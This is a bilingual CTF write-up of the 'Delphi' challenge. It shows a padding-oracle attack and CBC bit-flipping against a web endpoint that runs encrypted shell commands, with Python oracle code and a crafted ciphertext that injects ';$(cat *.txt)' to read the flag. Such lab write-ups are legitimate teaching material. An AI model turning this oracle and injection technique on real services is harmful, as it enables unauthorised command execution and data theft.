# Delphi (web/crypto)

###ENG
[PL](#pl-version)

The task was in `web` category, but actually there was almost no `web` there, only `crypto`.
We get a web interface in which we can invoke three commands from a select box.

The commands are `netstat`, `ps aux`, and `echo "This is a longer string that I want to use to test multiple-block patterns`.

We notice that all those commands actually point to the same endpoint `execute`, with different parameters, eg `/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
So we deduce that the command itself probably is somehow encrypted in the hex-string.
Since commands have different lengths we can assume that it is most likely block encryption.
By calculating `gcd` over payload lengths we have we can see that block size can be at most 16 bytes.

If we try to modify the payload we quickly hit `decrypt failure` message.
This seems like a nice setup for oracle padding attack, so we import our oracle padding breaker from crypto-commons are try to run it on the payloads.
We need to prepare oracle function, which will tell us if the decryption failed (presumably because of incorrect padding after decrypt):

```python
session = requests.Session()

def send(ct):
    while True:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return False
    else:
        return True
```

So we simply send the payload and check if there is `decrypt failed` message in the response.

With this in place we can now run:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

And we manage to recover what we expected -> `ps aux` with PKCS padding.
The same goes for `nestat` command, but the most interesting is the last payload because it has more than a single block we can recover.
The last command ends up to be:

`echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

Now that we know that we're dealing with CBC encryption, we can use bitflipping to force the payload to decrypt into plaintext of our choosing, at least up to a single block boundary.

The idea behind this attack comes directly from how CBC mode works.
In CBC encryption the plaintext is XORed with previous ciphertext block before encryption.
During decryption the block is first decrypted and then XORed with previous ciphertext block to recover the real plaintext.
This means, however, that if we modify a single byte of ciphertext of previous block, we will change corresponding byte of the decrypted plaintext in the next block!
Keep in mind this will also mess up the decryption of the changed ciphertext block, but this can't be helped.

What we need is to know the ciphertext and corresponding plaintext.
Then we know that `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` and we know all those values.
So now if we XOR `ct[k-1][i]` with `pt[i]` we should always get 0 as result, since `a xor a = 0`.
And now if we XOR this with any value, we will get this value as decryption result!

Fortunately we also have this in crypto-commons so we proceed with:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

This way we modify the decryption results for 5th block of the ciphertext.
4th block will be broken, but since it's just passed to `echo` we don't really care about it much.
So we just modified the ciphertext to decode into `echo ... garbage;$(cat *.txt)   ` which invoked in the shell will give us the flag.
And if we now go to the `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url with our modified ciphertext we get as expected:

`This is a longer string that I want to use��|��O� |��q)�;FLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `

###PL version

Zadanie co prawda było w kategorii `web` ale w praktyce nie było tam prawie nic z `web` a jedynie z `crypto`.
Dostajemy webowy interfejs z którego można wykonać trzy komendy używając select boxa.

Komendy to `netstat`, `ps aux` oraz `echo "This is a longer string that I want to use to test multiple-block patterns`.

Zauważamy szybko że wszytkie komendy prowadzą do tego samego endpointu `execue` z innym parametrem, np.
`/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
Zgadujemy, że komenda do wykonania jest zaszyfrowana w tym hex-stringu.
Skoro komendy mają różne długości to domyślamy się że mamy do czynienia z szyfrem blokowym.
Licząc `gcd` z długości znanych payloadów wynika że blok może mieć najwyżej 16 bajtów długości.

Jeśli ręcznie zmodyfikujemy payload to szybko dostajemy komunikat `decrypt failure`.
To sugeruje setup dla ataku oracle padding, więc importujemy nasz łamacz z crypto-commons i próbujemy uruchomić go dla posiadanych szyfrogramów.
Potrzebujemy do tego przygotować samą wyrocznie, która powie nam czy deszyfrowanie się powiodło czy nie (zakładamy że niepowodzenie wynika z niepopranego paddingu po deszyfrowaniu):

```python
session = requests.Session()

def send(ct):
    while True:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return False
    else:
        return True
```

Więc po prostu wysyłamy przygotowane dane i sprawdzamy czy w odpowiedzie dostaliśmy wiadomość `decrypt failed`.

Możemy teraz uruchomić:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

I udaje nam się odzyskać oczekiwaną komendę -> `ps aux` z paddingiem PKCS.
Tak samo jest dla payloadu z `netstat` ale najciekawszy jest ostatni szyfrogram, bo pozwala odzyskać więcej niż 1 blok.
Ostatnia komenda to:

`echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

Skoro wiemy już że mamy do czynienia z szyfrowaniem w trybie CBC, możemy wykorzystać bitflipping żeby zmodyfikować payload tak, aby deszyfrował się do wybranego przez nas plaintextu, przynajmniej do granicy jednego bloku.

Idea stojąca za tym atakiem wynika bezpośrednio z działania trybu CBC.
W tym trybie plaintext jest XORowwany z ciphertextem w poprzednim bloku przed szyfrowaniem.
Podczas deszyfrowania, po odkodowaniu bloku wynik jest XORowany z ciphertextem poprzedniego bloku w celu odzyskania prawdziwego plaintextu.
To oznacza jednak, że możemy zmodyfikować jeden bajt ciphertextu w poprzednim bloku i tym samym zmienić odpowiadający mu bajt odszyfrowanego plaintextu w kolejnym bloku!
Warto pamiętać, że zniszczymy w ten sposób odszyfrowaną wartość bloku gdzie zmieniamy ciphertext, ale tego nie da się ominąć.

Potrzebujemy znać ciphertext oraz odpowiadający mu plaintext.
Wiemy że `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` i znamy też wszystkie te wartości.
Teraz jeśli XORujemy `ct[k-1][i]` z `pt[i]` powinniśmy zawsze po odszyfrowaniu dostać 0 ponieważ `a xor a = 0`.
A teraz jeśli XORujemy to z dowolną inną wartością to uzyskamy tą wartość w wyniku deszyfrowania!

Szczęśliwie mamy to już zaimplementowane w crypto-commons więc wykonujemy:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

W ten sposób zmieniamy wynik deszyfrowania 5 bloku.
4 blok będzie popsuty, ale jest to input dla `echo` więc nie przejmuejmy się tym specjalnie.
Teraz nasz zmieniony ciphertext powinien zdeszyfrować się do czegoś w postaci `echo ... garbage;$(cat *.txt)   ` co wykonane w shellu da nam flagę.
I faktycznie wchodząc pod URL `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url ze zmienionym ciphertextem dostajemy:

`This is a longer string that I want to use��|��O� |��q)�;FLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `
